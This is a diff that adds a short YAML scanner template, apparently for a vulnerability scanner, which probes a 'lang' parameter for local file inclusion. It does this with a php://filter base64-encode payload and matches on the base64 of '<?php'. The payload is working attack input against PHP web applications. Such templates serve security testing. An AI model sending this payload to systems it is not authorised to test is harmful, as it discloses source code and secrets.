@@ -1,0 +1,20 @@
+id: lfi6-0158
+name: 'Traversal in lang'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via lang'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      lang:
+        - 'php://filter/convert.base64-encode/resource=index'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PD9waHA'
